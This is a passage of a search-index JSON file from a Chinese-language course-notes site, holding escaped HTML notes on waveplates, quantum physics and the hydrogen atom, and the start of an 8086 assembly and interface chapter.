<p>\u8fd9\u6837\u4e24\u675f\u76f8\u4f4d\u5dee\u6052\u5b9a\u3001\u632f\u52a8\u65b9\u5411\u5782\u76f4\u7684\u5149\u4e92\u76f8\u53e0\u52a0\uff0c\u4e00\u822c\u5f62\u6210\u692d\u5706\u504f\u632f\u5149\u3002</p> <ul> <li>\u56db\u5206\u4e4b\u4e00\u6ce2\u7247 \\(d=\\frac{\\lambda}{ 4|n_o- n_e|}\\) <ul> <li>\u4f7f \\(\\theta = 45^\u3002\\)\uff0c\u5c06\u5f97\u5230\u5706\u504f\u632f\u5149</li> </ul> </li> <li>\u4e8c\u5206\u4e4b\u4e00\u6ce2\u7247 \\(d=\\frac{\\lambda}{2|n_o - n_e|}\\)<ul> <li>\u7ebf\u504f\u632f\u5149\u901a\u8fc7\u4e8c\u5206\u4e4b\u4e00\u6ce2\u7247\u540e\u4ecd\u4e3a\u7ebf\u504f\u632f\u5149\uff0c\u4f46\u5176\u632f\u52a8\u9762\u65cb\u8f6c\u4e86 \\(2\\theta\\)</li> </ul> </li> </ul> <p>\u8fd9\u4e0d\u662f\u6211\u4eec\u674e\u8428\u5982\u56fe\u5f62\u5417</p>"},{"location":"Courses/Physics/PhysicsII/quantum/","title":"\u91cf\u5b50\u90e8\u5206","text":""},{"location":"Courses/Physics/PhysicsII/quantum/#_1","title":"\u91cf\u5b50\u90e8\u5206","text":"<p> \u7ea6 2398 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_2","title":"\u91cf\u5b50\u5149\u5b66\u57fa\u7840","text":""},{"location":"Courses/Physics/PhysicsII/quantum/#_3","title":"\u9ed1\u4f53\u8f90\u5c04","text":"<p>\u4efb\u4f55\u4e00\u4e2a\u7269\u4f53\uff0c\u5728\u4efb\u4f55\u6e29\u5ea6\u4e0b\u90fd\u8981\u5411\u5916\u8f90\u5c04\u5404\u79cd\u4e0d\u540c\u6ce2\u957f\u7684\u7535\u78c1\u6ce2\uff0c\u800c\u4e14\u8f90\u5c04\u51fa\u7684\u603b\u80fd\u91cf\u4ee5\u53ca\u80fd\u91cf\u6309\u6ce2\u957f\u7684\u5206\u5e03\u60c5\u51b5\u90fd\u4e0e\u8be5\u7269\u4f53\u7684\u6e29\u5ea6\u6709\u5173\uff0c\u8fd9\u79cd\u8f90\u5c04\u79f0\u4e3a\u70ed\u8f90\u5c04\u3002</p> <p>\u5982\u679c\u5728\u5355\u4f4d\u65f6\u95f4\u5185\uff0c\u4ece\u7269\u4f53\u8868\u9762\u5355\u4f4d\u9762\u79ef\u4e0a\u6240\u8f90\u5c04\u7684\u3001\u6ce2\u957f\u5728 \\(\\lambda \\sim \\lambda+\\Delta \\lambda\\) \u8303\u56f4\u5185\u7684\u8f90\u5c04\u80fd\u4e3a \\(dE_{\\lambda}\\)\uff0c\u90a3\u4e48\u8f90\u5c04\u80fd\u4e0e\u6ce2\u957f\u95f4\u9694\u7684\u6bd4\u503c\u79f0\u4e3a\u5355\u8272\u8f90\u51fa\u5ea6\uff1a</p> \\[ M_\\lambda (T)= \\frac{dE_\\lambda}{d\\lambda} \\] <p>\\(M_\\lambda\\) \u662f\u5173\u4e8e\u7269\u4f53\u6e29\u5ea6 \\(T\\) \u548c\u6240\u53d6\u5b9a\u6ce2\u957f \\(\\lambda\\) \u7684\u51fd\u6570\uff0c\u53cd\u6620\u4e86\u5728\u4e0d\u540c\u6e29\u5ea6\u4e0b\u8f90\u5c04\u6309\u6ce2\u957f\u7684\u5206\u5e03\u60c5\u51b5\u3002</p> <p>\u8f90\u5c04\u51fa\u5c04\u5ea6\u5b9a\u4e49\u4e3a\u5355\u4f4d\u65f6\u95f4\u3001\u5355\u4f4d\u8868\u9762\u79ef\u4e0a\u53d1\u5c04\u5168\u6ce2\u957f\u8303\u56f4\u5185\u7684\u8f90\u5c04\u80fd:</p> \\[ M(T)=\\int_0 ^{+\\infty} M_\\lambda (T)d\\lambda \\] <p>\u5b9a\u4e49\u4e00\u4e2a\u7269\u4f53\u5728\u6e29\u5ea6 \\(T\\) \uff0c\u6ce2\u957f\u8303\u56f4\u4e3a \\(\\lambda\\sim \\lambda +\\Delta \\lambda\\) \u65f6\uff0c\u5438\u6536\u7684\u7535\u78c1\u6ce2\u80fd\u91cf\u4e0e\u5165\u5c04\u80fd\u91cf\u7684\u6bd4\u503c\u4e3a\u5355\u8272\u5438\u6536\u7cfb\u6570\uff0c\u8bb0\u4e3a \\(\\alpha (\\lambda, T)\\)\uff1b\u53cd\u5c04\u7684\u7535\u78c1\u6ce2\u80fd\u91cf\u4e0e\u5165\u5c04\u80fd\u91cf\u7684\u6bd4\u503c\u4e3a\u5355\u8272\u53cd\u5c04\u7cfb\u6570\uff0c\u8bb0\u4e3a\\(\\gamma (\\lambda, T)\\)\u3002</p> <p>\u5bf9\u4e8e\u4e0d\u900f\u660e\u7684\u7269\u4f53\uff0c\u7531\u4e8e\u4e0d\u5b58\u5728\u900f\u5c04\u8fc7\u53bb\u7684\u80fd\u91cf\uff0c\u6709\u7b49\u5f0f\uff1a</p> \\[ \\alpha (\\lambda ,T) + \\gamma (\\lambda, T)=1 \\] <p>\u5b9e\u9a8c\u8868\u660e\uff0c\u4e0d\u540c\u7269\u4f53\u5bf9\u5165\u5c04\u7535\u78c1\u6ce2\u5177\u6709\u4e0d\u540c\u5438\u6536\u548c\u53cd\u5c04\u672c\u9886\u3002\u5982\u679c\u4e00\u4e2a\u7269\u4f53\u5728\u4efb\u4f55\u6e29\u5ea6\u4e0b\uff0c\u5bf9\u4e8e\u4efb\u4f55\u6ce2\u957f\u7684\u7535\u78c1\u8f90\u5c04\u90fd\u5168\u90e8\u5438\u6536\uff0c\u5373 \\(\\alpha (\\lambda, T)=1\\)\uff0c\u79f0\u8be5\u7269\u4f53\u4e3a\u7edd\u5bf9\u9ed1\u4f53\u3002</p> <p>\u82e5\u4ee5 \\(M_{0, \\lambda}(T)\\) \u8868\u793a\u9ed1\u4f53\u7684\u5355\u8272\u8f90\u51fa\u5ea6\uff0c\u5219\u6839\u636e\u57fa\u5c14\u970d\u592b\u5b9a\u7406\uff0c\u4efb\u4f55\u7269\u4f53\u7684\u5355\u8272\u8f90\u51fa\u5ea6\u548c\u5355\u8272\u5438\u6536\u7cfb\u6570\u7684\u6bd4\u503c\u90fd\u6ee1\u8db3\uff1a</p> \\[ \\frac{M_\\lambda (T)}{\\alpha (\\lambda, T)} = M_{0,\\lambda} (T) \\] <p>\u65af\u7279\u85e9-\u73bb\u5c14\u5179\u66fc\u5b9a\u7406\u6307\u51fa\uff0c\u9ed1\u4f53\u7684\u8f90\u5c04\u51fa\u5c04\u5ea6\u4e0e\u9ed1\u4f53\u6e29\u5ea6\u7684\u56db\u6b21\u65b9\u5448\u6b63\u6bd4\uff1a</p> \\[ M_0(T)= \\int _0^{+\\infty} M_{0,\\lambda} (T)d\\lambda = \\sigma T^4 \\] <p>\u5176\u4e2d\u65af\u7279\u85e9-\u73bb\u5c14\u5179\u66fc\u5e38\u91cf \\(\\sigma =5.67\\times 10^{-8} W / (m^2\\cdot K^4)\\)</p> <p>\u7ef4\u6069\u4f4d\u79fb\u5b9a\u5f8b\u6307\u51fa\uff0c\u5bf9\u4e8e\u9ed1\u4f53\u5355\u8272\u8f90\u51fa\u5ea6\u66f2\u7ebf\uff0c\u5176\u5cf0\u503c\u6ce2\u957f \\(\\lambda _m\\) \u548c\u5bf9\u5e94\u6e29\u5ea6 \\(T\\) \u6210\u53cd\u6bd4\uff1a</p> \\[ T\\lambda _m = b=2.898\\times 10^{-3} m\\cdot K \\] <p></p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_4","title":"\u5149\u7535\u6548\u5e94","text":"<p>\u7535\u78c1\u8f90\u5c04\u5728\u7a7a\u95f4\u4e2d\u4f20\u64ad\u662f\u79bb\u6563\u7684\u3001\u91cf\u5b50\u5316\u7684\uff0c\u79f0\u4e3a\u5149\u5b50\u3002</p> <ul> <li>\u80fd\u91cf\uff1a\\(E=hv\\)</li> <li>\u8d28\u91cf\uff1a\\(m=\\frac{hv}{c^2} = \\frac{h}{c\\lambda}\\)</li> <li>\u52a8\u91cf\uff1a\\(p=\\frac{hv}{c} =\\frac{h}{\\lambda}\\)</li> </ul> <p>\u5f53\u5149\u5c04\u5728\u91d1\u5c5e\u8868\u9762\u65f6\uff0c\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\uff0c\u6709\u7535\u5b50\u4ece\u91d1\u5c5e\u8868\u9762\u9038\u51fa\u7684\u73b0\u8c61\u79f0\u4e3a\u5149\u7535\u6548\u5e94\uff0c\u6240\u9038\u51fa\u7684\u7535\u5b50\u79f0\u4e3a\u5149\u7535\u5b50\u3002</p> <p>\u4e00\u4e2a\u7535\u5b50\u83b7\u5f97\u4e00\u4e2a\u5149\u5b50\u7684\u80fd\u91cf\uff0c\u9996\u5148\u7528\u4e8e\u514b\u670d\u8868\u9762\u963b\u529b\u6240\u9700\u7684\u9038\u51fa\u529f \\(A\\)\uff0c\u5269\u4f59\u7684\u80fd\u91cf\u4f5c\u4e3a\u7535\u5b50\u7684\u6700\u5927\u521d\u52a8\u80fd\\(E_{km}\\)\uff1a</p> \\[ hv -A=E_{km}= \\frac{1}{2}mv_m^2 \\] <p>\u5f53\u6211\u4eec\u589e\u52a0\u7684\u53cd\u5411\u904f\u6b62\u7535\u538b\\(U_a\\)\u6070\u597d\u7b49\u4e8e\u7535\u5b50\u7684\u6700\u5927\u521d\u52a8\u80fd\u65f6\uff0c\u5149\u7535\u6d41\u4e3a 0\uff0c\u5373\uff1a</p> \\[ E_{km} =e|U_a| \\] <p>\u5f53\u5149\u9891\u7387\u5c0f\u4e8e\u622a\u6b62\u9891\u7387(\u7ea2\u9650\u9891\u7387)\\(v_0\\) \u65f6\uff0c\u7535\u5b50\u83b7\u5f97\u80fd\u91cf\u5c0f\u4e8e\u9038\u51fa\u529f\uff0c\u4ece\u800c\u4e0d\u4ea7\u751f\u5149\u7535\u6d41\uff1a</p> \\[ hv_0 = A \\] <p>\u968f\u7740\u7535\u538b\u589e\u5927\uff0c\u5149\u7535\u6d41\u589e\u5927\u81f3\u9971\u548c\u503c\uff0c\u8be5\u503c\u4e0e\u6fc0\u53d1\u7684\u5149\u7535\u5b50\u6570\u91cf\u6709\u5173\uff08\u7b49\u4e8e\u5149\u5b50\u6570\u91cf\uff09\uff0c\u5176\u4e2d\u5149\u5b50\u6570\u91cf \\(n\\) \u4e0e\u5149\u5f3a \\(I\\) \u7684\u5173\u7cfb\u4e3a\uff1a</p> \\[ I=nhv \\]"},{"location":"Courses/Physics/PhysicsII/quantum/#_5","title":"\u5eb7\u666e\u987f\u6548\u5e94","text":"<p>\u5355\u8272 X \u5c04\u7ebf\u6295\u5c04\u5230\u77f3\u58a8\u6676\u4f53\u53ca\u5176\u5b83\u6750\u6599\u4e0a\u65f6\uff0c\u6563\u5c04\u5149\u7ebf\u9664\u4e86\u6709\u4e0e\u5165\u5c04\u6ce2\u957f \\(\\lambda_0\\) \u76f8\u540c\u7684\u6210\u5206\u5916\uff0c\u8fd8\u542b\u6709\u6ce2\u957f\u5927\u4e8e \\(\\lambda_0\\) \u7684\u90e8\u5206\uff0c\u4e14\u6ce2\u957f\u7684\u53d8\u5316 \\(\\Delta \\lambda =\\lambda -\\lambda_0\\) \u968f\u6563\u5c04\u89d2 \\(\\phi\\) \u7684\u589e\u5927\u800c\u589e\u5927\uff0c\u4e0e \\(\\lambda_0\\) \u548c\u7269\u8d28\u65e0\u5173\u3002</p> <p>\u5176\u539f\u56e0\u662f\u5165\u5c04\u5149\u5b50\u548c\u7535\u5b50\u53d1\u751f\u5f39\u6027\u78b0\u649e\uff0c\u5149\u5b50\u90e8\u5206\u80fd\u91cf\u8f6c\u6362\u4e3a\u7535\u5b50\u52a8\u80fd\uff0c\u4ece\u800c\u5bfc\u81f4\u6ce2\u957f\u589e\u52a0\uff1a</p> \\[\\begin{array}l \\text{\u80fd\u91cf\u5b88\u6052\uff1a }hv_0 +m_e c^2=hv + mc^2 \\\\ \\text{\u52a8\u91cf\u5b88\u6052\uff1a } \\begin{cases} \\frac{hv_0}{c} = \\frac{hv}{c}\\cos \\phi +mv\\cos \\theta  \\\\ 0= \\frac{hv}{c}\\sin \\phi - mv \\sin \\theta \\end{cases} \\end{array} \\] <p>\u5176\u4e2d \\(m_e\\) \u4e3a\u7535\u5b50(\u9759\u6b62)\u8d28\u91cf\uff0c\\(m\\) \u4e3a\u7535\u5b50\u76f8\u5bf9\u8bba\u8d28\u91cf\u3002</p> <p></p> <p>\u5bf9\u4ee5\u4e0a\u4e09\u4e2a\u65b9\u7a0b\u6d88\u53bb \\(v\\) \u548c \\(\\theta\\) \uff0c\u53ef\u5f97\u5230\u6563\u5c04\u7ebf\u6ce2\u957f\u53d8\u5316\u4e0e\u6563\u5c04\u89d2 \\(\\phi\\) \u7684\u5173\u7cfb\uff1a</p> \\[ \\Delta \\lambda =\\lambda -\\lambda_0 = \\frac{2h}{m_ec} \\sin ^2 \\frac{\\phi}{2} = \\frac{h}{m_ec} (1-\\cos \\phi) \\] <p>\u5176\u4e2d \\(\\lambda_c = \\frac{h}{m_ec}=0.00243nm = 2.43\\times 10^{-12}m\\) \u79f0\u4e3a\u5eb7\u666e\u987f\u6ce2\u957f\u3002</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_6","title":"\u91cf\u5b50\u529b\u5b66\u7b80\u4ecb","text":""},{"location":"Courses/Physics/PhysicsII/quantum/#_7","title":"\u5fb7\u5e03\u7f57\u610f\u6ce2","text":"<p>\u5b9e\u7269\u7c92\u5b50\u540c\u6837\u5177\u6709\u6ce2\u7c92\u4e8c\u8c61\u6027\uff0c\u5176\u6ce2\u957f \\(\\lambda\\) \u7531\u52a8\u91cf\u786e\u5b9a\uff0c\u9891\u7387 \\(v\\) \u7531\u80fd\u91cf\u786e\u5b9a\uff1a</p> \\[ p=mv=\\frac{h}{\\lambda}, \\ \\ E=mc^2 = hv \\] <p>\u82e5\u5ffd\u7565\u76f8\u5bf9\u8bba\u6548\u5e94\uff0c\u7535\u5b50\u52a8\u80fd\u540c\u6837\u4e3a \\(E_k= \\frac{p^2}{2m}\\)\uff0c\u5219 \\(\\lambda =\\frac{h}{p}= \\frac{h}{\\sqrt{2mE_k}}\\)</p> <p>\u4e0d\u8fc7\u5149\u5b50\u7684\u52a8\u80fd\u5c31\u662f\u5176\u603b\u80fd\u91cf\uff0c\u5373 \\(E_k=mc^2 =hv\\)\u3002</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_8","title":"\u4e0d\u786e\u5b9a\u6027\u7406\u8bba","text":"<p>\u5fae\u89c2\u7c92\u5b50\u7684(\u4f4d\u7f6e\u548c\u52a8\u91cf)/(\u5904\u4e8e\u67d0\u4e2a\u72b6\u6001\u7684\u65f6\u95f4\u4e0e\u80fd\u91cf)\u4e0d\u53ef\u80fd\u540c\u65f6\u51c6\u786e\u6d4b\u5b9a\u3002</p> \\[\\begin{array}l \\text{\u52a8\u91cf\u548c\u4f4d\u7f6e\u7684\u4e0d\u786e\u5b9a\u6027\u5173\u7cfb\uff1a }\\Delta x\\Delta p_x \\ge \\frac{h}{4\\pi} \\\\ \\text{\u80fd\u91cf\u548c\u65f6\u95f4\u7684\u4e0d\u786e\u5b9a\u6027\u5173\u7cfb\uff1a }\\Delta E\\Delta t \\ge \\frac{h}{4\\pi} \\end{array}\\] <p>\u5728\u4e0d\u786e\u5b9a\u6027\u7406\u8bba\u76f8\u5173\u7684\u9898\u76ee\u4e2d\uff0c\u6211\u4eec\u8fd8\u5e38\u5e38\u9700\u8981\u8ba1\u7b97\u901a\u8fc7\u67d0\u79cd\u51fd\u6570\u5173\u7cfb\u5f97\u5230\u7684\u95f4\u63a5\u6d4b\u91cf\u91cf\u7684\u4e0d\u786e\u5b9a\u5ea6\u3002\u4e00\u822c\u53ef\u4ee5\u5206\u4e3a\u548c\u5dee\u5f62\u5f0f\u7684\u51fd\u6570\u548c\u79ef\u5546\u5f62\u5f0f\u7684\u51fd\u6570\u4e24\u79cd\u60c5\u51b5\uff1a</p> \\[\\begin{array}l \\text{\u548c\u5dee\u5f62\u5f0f\uff1a } \\Delta y=\\sqrt{\\sum (\\frac{\\partial f}{\\partial x_i}\\Delta x)^2} \\\\ \\text{\u79ef\u5546\u5f62\u5f0f\uff1a}\\frac{\\Delta y}{y} = \\sqrt{\\sum (\\frac{\\partial \\ln f}{\\partial x_i}\\Delta x)^2} \\end{array} \\] <p>\u4e0d\u786e\u5b9a\u5ea6\u95f4\u63a5\u6d4b\u91cf\u5b9e\u4f8b</p> <p>\u82e5 \\(y=k / x\\) \uff0c\u5219 \\(\\Delta y= k\\Delta x / x^2\\)</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_9","title":"\u6ce2\u51fd\u6570","text":"<p>\u6ce2\u51fd\u6570 \\(\\Psi (x,y,z,t)\\) \u662f\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u51fd\u6570\uff0c\u8868\u73b0\u4e86\u7c92\u5b50\u7684\u8fd0\u52a8\u72b6\u6001\u3002</p> <p>\u5b9a\u6001\u6ce2\u51fd\u6570</p> <p>\u82e5\u7c92\u5b50\u8fd0\u52a8\u72b6\u6001\u4e0d\u968f\u65f6\u95f4\u53d8\u5316\uff0c\u5219\u53ef\u4ee5\u5b9a\u6001\u4e3a \\(\\psi (x,y,z)\\)</p> <p>\u5728\u7269\u7406\u610f\u4e49\u4e0a\uff0c\u6ce2\u51fd\u6570\u6a21\u957f\u7684\u5e73\u65b9 \\(|\\Psi (x,y,z,t)|^2=\\Psi * \\Psi\\) \u4ee3\u8868\u7c92\u5b50\u5728\u67d0\u4e00\u65f6\u95f4\u5728\u4e00\u56fa\u5b9a\u70b9\u51fa\u73b0\u7684\u7684\u6982\u7387\u5bc6\u5ea6\u3002</p> <ul> <li>&lt;1&gt; \\(\\Psi(x,y,z,t)\\) \u662f\u5355\u503c\u51fd\u6570</li> <li>&lt;2&gt; \\(\\Psi(x,y,z,t)\\) \u662f\u8fde\u7eed\u51fd\u6570</li> <li>&lt;3&gt; \\(\\Psi(x,y,z,t)\\) \u662f\u6709\u9650\u51fd\u6570</li> <li>&lt;4&gt; \\(\\iiint _v \\Psi * \\Psi dV=1\\) \uff0c\u5373\u7c92\u5b50\u5728\u5168\u7a7a\u95f4\u51fa\u73b0\u7684\u6982\u7387\u4e3a 1\u3002</li> </ul> <p>\u4e00\u7ef4\u65e0\u9650\u6df1\u52bf\u9631\u6307\u7684\u662f\u7c92\u5b50\u5728\u67d0\u4e00\u533a\u95f4\u5185\u52bf\u80fd\u4e3a 0\uff0c\u5176\u4f59\u533a\u95f4\u52bf\u80fd\u4e3a\u65e0\u9650\u5927\uff0c\u5219\u6839\u636e\u859b\u5b9a\u8c14\u65b9\u7a0b\uff0c\u7c92\u5b50\u53ea\u80fd\u5728\u8be5\u533a\u95f4\u51fa\u73b0\u3002</p> <p>\u6ce2\u51fd\u6570\u9898\u76ee\u505a\u9898\u7684\u5957\u8def\u4e00\u822c\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; \u4ee4 \\(\\int_{-\\infty}^{+\\infty} \\psi^2(x)dx = 1\\) \uff0c\u89e3\u5f97\u5f52\u4e00\u5316\u5e38\u6570 \\(A\\)</li> <li>&lt;2&gt; \u5e26\u5165\u5e38\u6570\u5f97\u5230\u6ce2\u51fd\u6570\uff0c\u8fdb\u800c\u5f97\u5230\u6982\u7387\u5bc6\u5ea6\u51fd\u6570 \\(f(x) =\\psi^2(x)\\)</li> <li>&lt;3&gt; \u5229\u7528\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u8ba1\u7b97\u6700\u5927\u6982\u7387\u5bc6\u5ea6\u4f4d\u7f6e\u3001\u533a\u95f4 \\((a,b)\\) \u4e0a\u51fa\u73b0\u7684\u6982\u7387\u7b49</li> </ul> <p>\u8ba1\u7b97\u5668\u53ef\u4ee5\u6c42\u5b9a\u79ef\u5206!?\u4e0d\u592a\u4f1a\uff0c\u6d47\u6d47\u7a9d...</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_10","title":"\u6c22\u539f\u5b50\u548c\u6c22\u539f\u5b50\u7ed3\u6784\u521d\u6b65","text":""},{"location":"Courses/Physics/PhysicsII/quantum/#_11","title":"\u73bb\u5c14\u6c22\u539f\u5b50\u7406\u8bba","text":""},{"location":"Courses/Physics/PhysicsII/quantum/#_12","title":"\u73bb\u5c14\u7406\u8bba\u6982\u8ff0","text":"<p>\u73bb\u5c14\u7406\u8bba\u5efa\u7acb\u5728\u7ecf\u5178\u7406\u8bba\u7684\u57fa\u7840\u4e0a\uff0c\u4f46\u4ed6\u52a0\u5165\u4e86\u4e00\u4e9b\u91cf\u5b50\u5316\u7684\u5047\u8bbe\uff1a</p> <ul> <li>&lt;1&gt; \u5b9a\u6001\u5047\u8bbe\uff1a \u7535\u5b50\u56f4\u7ed5\u539f\u5b50\u6838\u4f5c\u5706\u5468\u8fd0\u52a8\u65f6\uff0c\u53ea\u80fd\u5904\u5728\u4e00\u4e9b\u5206\u7acb\u7684\u7a33\u5b9a\u72b6\u6001\uff0c\u7b80\u79f0\u5b9a\u6001\u3002<ul> <li>\u5f53\u7535\u5b50\u5904\u5728\u8fd9\u4e9b\u5206\u7acb\u8f68\u9053\u4e0a\u65f6\uff0c\u7535\u5b50\u867d\u7136\u4f5c\u52a0\u901f\u8fd0\u52a8\uff0c\u4f46\u4e0d\u8f90\u5c04\u80fd\u91cf\uff0c\u6545\u539f\u5b50\u5177\u6709\u7a33\u5b9a\u7684\u80fd\u91cf\uff0c\u8fd9\u4e9b\u80fd\u91cf\u53d6\u91cf\u5b50\u5316\u7684\u4e0d\u8fde\u7eed\u503c\u79f0\u4e3a\u80fd\u7ea7\uff1a \\(E=E(n)\\)</li> </ul> </li> <li>&lt;2&gt; \u8dc3\u8fc1\u5047\u8bbe\uff1a \u539f\u5b50\u4ece\u4e00\u4e2a\u5b9a\u6001\u5230\u53e6\u4e00\u4e2a\u5b9a\u6001\u79f0\u4e3a\u8dc3\u8fc1\uff0c\u8dc3\u8fc1\u8fc7\u7a0b\u4f1a\u5438\u6536\u6216\u53d1\u5c04\u5149\u5b50<ul> <li>\u5149\u5b50\u9891\u7387\u7531 \\(hv=E_n -E_k\\) \u51b3\u5b9a</li> </ul> </li> <li>&lt;3&gt; \u91cf\u5b50\u5316\u6761\u4ef6\uff1a \u5047\u8bbe\u5728\u5b9a\u6001\u65f6\uff0c\u7535\u5b50\u7684\u8f68\u9053\u89d2\u52a8\u91cf\u4e5f\u662f\u91cf\u5b50\u5316\u7684\uff0c\u53ea\u80fd\u53d6\u7ea6\u5316\u666e\u6717\u514b\u5e38\u91cf \\(\\bar{h}\\) \u7684\u6574\u6570\u500d<ul> <li>\\(L=n\\bar{h} =nh / 2\\pi\\)</li> </ul> </li> </ul> <p>\u6c22\u539f\u5b50\u8f68\u9053\u534a\u5f84\u662f\u91cf\u5b50\u5316\u7684\uff1a</p> \\[ \\frac{1}{4\\pi \\varepsilon_0} \\frac{e^2}{r ^2} =m \\frac{v^2}{r} \\to r_n =n^2 \\frac{\\varepsilon_0 h^2}{\\pi me^2} \\] <p>\u5176\u4e2d \\(r_1\\) \u79f0\u4e3a\u73bb\u5c14\u534a\u5f84 \\(a_0\\)\uff0c\u4ece\u800c \\(r_n =n^2 a_0\\)</p> <p>\u6c22\u539f\u5b50\u80fd\u91cf\u662f\u91cf\u5b50\u5316\u7684\uff1a</p> \\[ E_n = - \\frac{1}{n^2} \\left(\\frac{me^4}{8\\varepsilon_0 ^2 h^2}\\right) \\] <p>\u5176\u4e2d \\(E_1=-13.6eV\\) \u79f0\u4e3a\u57fa\u6001\u80fd\u7ea7\uff0c\\(E_n = E_1/n^2\\)</p> <p>\u5df2\u77e5\u73bb\u5c14\u534a\u5f84 \\(a_0\\)\uff0c\u8ba1\u7b97\u6c22\u539f\u5b50\u7535\u5b50\u6cbf\u7b2cn\u73bb\u5c14\u8f68\u9053\u8fd0\u52a8\u65f6\uff0c\u5176\u5fb7\u5e03\u7f57\u610f\u6ce2\u957f\u5927\u5c0f</p> <p>\u522b\u7528 \\(\\frac{mv^2}{r}= \\frac{1}{4\\pi \\varepsilon_0} \\frac{e^2}{r^2}\\)\uff0c\u76f4\u63a5\u7528\u89d2\u52a8\u91cf \\(L=mvr_n = \\frac{nh}{2\\pi}\\) \u6c42\u89e3\u3002\u5df2\u77e5 \\(r_n = n^2a_0\\)\uff0c\u6613\u6c42\u5f97 \\(\\lambda = 2\\pi na\\)</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_13","title":"\u6c22\u539f\u5b50\u5149\u8c31","text":"<p>\u6839\u636e\u73bb\u5c14\u7406\u8bba\uff0c\u6c22\u539f\u5b50\u53d1\u751f\u5b9a\u6001\u8dc3\u8fc1\u65f6\u4f1a\u53d1\u5c04\u6216\u5438\u6536\u4e00\u4e2a\u5149\u5b50\uff0c\u5176\u6ce2\u957f\u4e3a\uff1a</p> \\[ \\frac{hc}{\\lambda} =E_i -E_f ,\\text{\u6216}\\  \\frac{1}{\\lambda} =R( \\frac{1}{n_f^2} - \\frac{1}{n_i^2}) \\] <p>\\(R=-\\frac{E_1}{hc}\\) \u79f0\u4e3a\u91cc\u5fb7\u4f2f\u5e38\u6570\uff0c\u8003\u8bd5\u4e2d\u4f1a\u7ed9\u51fa(\u4f1a\u7684\u5427!?)</p> <p></p> <p>\u53ef\u89c1\u5149\u6ce2\u957f\u8303\u56f4 400 nm ~ 760 nm\uff0c\u4f4d\u4e8e\u5411\u5df4\u5c14\u9ed8\u7cfb\u8dc3\u8fc1\u91ca\u653e\u7684\u5149\u8303\u56f4\u4e4b\u4e2d</p>"},{"location":"Courses/Physics/PhysicsII/quantum/#_14","title":"\u91cf\u5b50\u529b\u5b66\u6c22\u539f\u5b50\u7406\u8bba","text":"<ul> <li>\\(|\\psi_{n,l, m_l}(r,\\theta,\\phi)|^2\\) \u4ee3\u8868\u7535\u5b50\u51fa\u73b0\u5728\u6781\u5750\u6807 \\((r,\\theta, \\phi)\\) \u5904\u7684\u6982\u7387\u5bc6\u5ea6</li> <li>\u5f84\u5411\u6982\u7387\u5bc6\u5ea6 \\(r^2 |R_{n,l} (r)|^2\\) \u4ee3\u8868\u7535\u5b50\u51fa\u73b0\u5728 \\(r\\) \u5904\u7684\u6982\u7387\u5bc6\u5ea6(\u6ce8\u610f\u8981\u4e58 \\(r^2\\))</li> <li>\u5386\u5e74\u5377\u91cc\u51fa\u73b0\u8fc7\u7684\u81ea\u65cb\u91cf\u5b50\u6570 \\(m_s\\)\uff0c\u53ea\u80fd\u53d6\u503c \u00b1\\(\\frac{1}{2}\\)</li> <li>\u5728\u73bb\u5c14\u6c22\u539f\u5b50\u7406\u8bba\u4e2d\uff0c\u7535\u5b50\u8f68\u9053\u89d2\u52a8\u91cf\u6700\u5c0f\u503c\u4e3a \\(\\frac{h}{2\\pi}\\)\uff1b\u800c\u5728\u91cf\u5b50\u529b\u5b66\u7406\u8bba\u4e2d\uff0c\u7535\u5b50\u8f68\u9053\u89d2\u52a8\u91cf\u6700\u5c0f\u503c\u4e3a \\(\\sqrt{l(l+1)} h/2\\pi|_{l=0} = 0\\)</li> </ul> <p>Example</p> <p></p>"},{"location":"Courses/asm/","title":"\u6c47\u7f16\u4e0e\u63a5\u53e3","text":""},{"location":"Courses/asm/#_1","title":"\u6c47\u7f16\u4e0e\u63a5\u53e3","text":"<p> \u7ea6 56 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>bhh \u7684\u6c47\u7f16\u8bed\u8a00\u8bb2\u7684\u662f 8086 \u7684\u7f16\u7a0b\uff0c\u800c cm \u7684\u6c47\u7f16\u4e0e\u63a5\u53e3\u8bb2\u7684\u662f\u76f8\u5bf9\u6765\u8bb2\u66f4\u9ad8\u5c42\u7684\u4e1c\u897f\uff0c\u533a\u522b\u8f83\u5927\uff0c\u4f46\u662f\u6709\u4e0a\u8fc7\u524d\u8005\u7684\u8bfe\u5f53\u7136\u66f4\u597d\u3002</p>"},{"location":"Courses/asm/ch11/","title":"Basic I/O Interface","text":""},{"location":"Courses/asm/ch11/#basic-io-interface","title":"Basic I/O Interface","text":"<p> \u7ea6 6535 \u4e2a\u5b57  70 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 34 \u5206\u949f</p>"},{"location":"Courses/asm/ch11/#hardware-specifications","title":"Hardware Specifications","text":"<p>chapter 9</p> <p>Intel 8086 \u548c 8088 \u786c\u4ef6\u90fd\u5305\u88c5\u6709 40-pin dual in-line packages\uff08DIPs\uff09\uff0c\u533a\u522b\u5728\u4e8e 8086 \u7684 Data Bus \u5bbd\u5ea6\u4e3a 16-bit\uff0c8088 \u7684 Data Bus \u5bbd\u5ea6\u4e3a 8-bit\u3002</p> <p>\u56e0\u6b64 8086 \u80fd\u591f\u66f4\u6709\u6548\u7387\u5730\u4f20\u8f93 16-bit \u6570\u636e\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u4e5f\u90fd\u4ee5 8086 \u4e3a\u4f8b</p> <p></p> <p>8086 \u53ef\u4ee5\u8fd0\u884c\u5728\u4ee5\u4e0b\u4e24\u79cd\u6a21\u5f0f\uff0c\u4e24\u79cd\u6a21\u5f0f\u4e0b\u4e0d\u540c\u5f15\u811a\u529f\u80fd\u4e0d\u540c\uff0c\u901a\u8fc7 33 pin \u53e3 